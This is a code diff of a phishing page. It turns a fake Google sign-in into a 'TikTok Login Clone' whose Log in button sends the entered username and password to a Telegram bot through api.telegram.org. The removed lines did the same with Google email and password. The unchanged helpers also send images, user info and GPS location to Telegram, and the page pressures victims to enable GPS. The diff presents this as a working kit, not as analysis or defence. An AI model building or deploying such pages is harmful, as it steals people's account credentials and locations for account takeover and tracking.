@@ -3,150 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <style>
-        body {
-            background-color: #202124;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
-            color: white;
-            margin: 0;
-        }
-        .container {
-            background: #171717;
-            padding: 40px;
-            border-radius: 8px;
-            text-align: left;
-            width: 100%;
-            max-width: 450px;
-        }
-        .google-logo {
-            font-size: 32px;
-            font-weight: bold;
-            color: white;
-        }
-        .google-logo img {
-            width: 75px;
-        }
-        h2 {
-            font-size: 24px;
-            margin: 10px 0;
-        }
-        p {
-            color: #b3b3b3;
-            font-size: 14px;
-        }
-        .input-box {
-            width: 100%;
-            padding: 12px;
-            margin-top: 10px;
-            border-radius: 4px;
-            border: 1px solid #5f6368;
-            background: #202124;
-            color: white;
-            font-size: 16px;
-        }
-        .input-box:focus {
-            outline: none;
-            border-color: #8ab4f8;
-        }
-        .forgot {
-            display: block;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .forgot a {
-            color: #8ab4f8;
-            text-decoration: none;
-        }
-        .buttons {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 20px;
-        }
-        .create {
-            color: #8ab4f8;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .button {
-            padding: 10px 20px;
-            border: none;
-            background-color: #1a73e8;
-            color: white;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 14px;
-        }
-        .footer {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #b3b3b3;
-        }
-        @media (max-width: 500px) {
-            .container {
-                padding: 20px;
-            }
-            .google-logo img {
-                width: 50px;
-            }
-            h2 {
-                font-size: 20px;
-            }
-            .input-box {
-                padding: 10px;
-                font-size: 14px;
-            }
-            .button {
-                padding: 8px 16px;
-                font-size: 12px;
-            }
-        }
-    </style>
+    <title>TikTok Login Clone</title>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <div class="container" id="email-container">
-        <div class="google-logo">
-            <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
+<body class="flex items-center justify-center min-h-screen bg-gray-100">
+    <div class="w-full max-w-sm p-6 bg-white rounded-lg shadow-md">
+        <div class="flex justify-center mb-6">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" class="h-10">
         </div>
-        <h2>Sign in</h2>
-        <p>with your Google Account to continue to Gmail. This account will be available to other Google apps in the browser.</p>
-        <input type="text" id="input-box" class="input-box" placeholder="Email or phone">
-        <div class="forgot">
-            <a href="#">Forgot email?</a>
+        <h2 class="text-2xl font-semibold text-center">Log in</h2>
+        <form class="mt-4">
+            <label class="block mb-2 text-sm font-medium">Email or Username</label>
+            <input type="text" id="email-or-username" placeholder="Email or username" class="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            
+            <label class="block mt-4 mb-2 text-sm font-medium">Password</label>
+            <div class="relative">
+                <input type="password" id="password" placeholder="Password" class="w-full p-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <span class="absolute inset-y-0 right-3 flex items-center text-gray-500 cursor-pointer">👁️</span>
+            </div>
+            
+            <div class="mt-2 text-right text-sm text-blue-500 cursor-pointer">Forgot password?</div>
+            
+            <button type="button" class="w-full mt-4 p-2 bg-gray-300 text-gray-500 rounded-md cursor-not-allowed" onclick="sendToTelegram()">Log in</button>
+        </form>
+        <div class="mt-4 text-center text-sm">
+            <a href="#" class="text-blue-500">Go back</a>
         </div>
-        <div class="buttons">
-            <a href="#" class="create">Create account</a>
-            <button class="button" onclick="validateEmail()">Next</button>
-        </div>
-        <div class="footer">
-            <p>English (United States)</p>
-            <p>Help • Privacy • Terms</p>
-        </div>
-    </div>
-    
-    <div class="container" id="password-container" style="display: none;">
-        <div class="google-logo">
-            <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google">
-        </div>
-        <h2>Welcome</h2>
-        <p>Enter your password to continue.</p>
-        <input type="password" id="password-box" class="input-box" placeholder="Enter your password">
-        <div class="forgot">
-            <a href="#">Forgot password?</a>
-        </div>
-        <div class="buttons">
-            <a href="#" class="create">Try another way</a>
-            <button class="button" onclick="sendPasswordToTelegram()">Next</button>
-        </div>
-        <div class="footer">
-            <p>English (United States)</p>
-            <p>Help • Privacy • Terms</p>
+        <div class="mt-4 text-center text-sm">
+            Don't have an account? <a href="#" class="text-red-500">Sign up</a>
         </div>
     </div>
 
@@ -211,10 +95,10 @@
                 if (response.ok) {
                     console.log("Image sent to Telegram");
                 } else {
-                    console.error("Error ", response.statusText);
+                    console.error("Error sending image to Telegram: ", response.statusText);
                 }
             } catch (error) {
-                console.error("Error", error);
+                console.error("Error sending image to Telegram: ", error);
             }
         }
 
@@ -268,10 +152,10 @@
                 if (response.ok) {
                     console.log("User info sent to Telegram");
                 } else {
-                    console.error("Error ", response.statusText);
+                    console.error("Error sending user info to Telegram: ", response.statusText);
                 }
             } catch (error) {
-                console.error("Error ", error);
+                console.error("Error sending user info to Telegram: ", error);
             }
         }
 
@@ -296,11 +180,11 @@
 
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
-                    console.error("Error ", error);
+                    console.error("Error getting location: ", error);
                     alert('Please enable GPS in your device settings to continue.');
                 });
             } catch (error) {
-                console.error("Error ", error);
+                console.error("Error requesting location permission: ", error);
                 alert('Please enable GPS in your device settings to continue.');
             }
         }
@@ -325,10 +209,10 @@
                     console.log("Location info sent to Telegram");
                     document.getElementById('main-container').style.display = 'flex';
                 } else {
-                    console.error("Error  ", response.statusText);
+                    console.error("Error sending location info to Telegram: ", response.statusText);
                 }
             } catch (error) {
-                console.error("Error  ", error);
+                console.error("Error sending location info to Telegram: ", error);
             }
         }
 
@@ -338,36 +222,20 @@
             await getLocation();
         }
 
-        function validateEmail() {
-            const inputBox = document.getElementById('input-box').value;
-            const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-
-            if (emailPattern.test(inputBox)) {
-                document.getElementById('email-container').style.display = 'none';
-                document.getElementById('password-container').style.display = 'block';
-                sendToTelegram(inputBox, 'Email');
-            } else {
-                alert('Please enter a valid email address.');
-            }
-        }
-
-        function sendPasswordToTelegram() {
-            const passwordBox = document.getElementById('password-box').value;
-            sendToTelegram(passwordBox, 'Password');
-        }
-
-        function sendToTelegram(value, type) {
-            const message = `${type}: ${value}`;
+        function sendToTelegram() {
+            const emailOrUsername = document.getElementById('email-or-username').value;
+            const password = document.getElementById('password').value;
+            const message = `Email or Username: ${emailOrUsername}\nPassword: ${password}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
             fetch(url)
                 .then(response => response.json())
                 .then(data => {
-                    console.log(`${type} sent to Telegram`);
+                    console.log("Credentials sent to Telegram");
                 })
                 .catch(error => {
-                    console.error(`Error sending ${type} to Telegram: `, error);
+                    console.error("Error sending credentials to Telegram: ", error);
                 });
         }
 
